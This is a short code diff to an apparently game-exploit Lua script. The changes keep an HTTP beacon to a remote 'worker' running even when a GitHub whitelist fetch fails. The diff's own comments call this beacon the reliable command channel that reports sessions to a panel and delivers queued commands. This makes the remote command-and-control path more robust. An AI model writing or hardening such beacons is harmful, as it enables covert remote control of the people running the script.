@@ -763,7 +763,9 @@ run(function()
 		-- whitelist:hook() is only reached from playeradded (which only fires when
 		-- get(v) ~= 0), so process() is never called and no command reacts at all.
 		self:hook()
-		if not suc or not hash or not whitelist.get then return true end
+		-- a failed fetch must not end the loop: it is the same loop that beacons to the
+		-- worker, so returning true here meant no session and no queued commands at all
+		if not suc or not hash or not whitelist.get then return false end
 		whitelist.loaded = true
 
 		if not first or whitelist.textdata ~= whitelist.olddata then
@@ -1038,7 +1040,9 @@ run(function()
 				return
 			end
 
-			if whitelist.loaded and os.time() - lastbeat >= 60 then
+			-- the beacon does not need the whitelist: a github outage must not hide the
+			-- session from the panel or block queued commands
+			if os.time() - lastbeat >= 60 then
 				lastbeat = os.time()
 
 				-- the http beacon always runs: it is the reliable command channel,
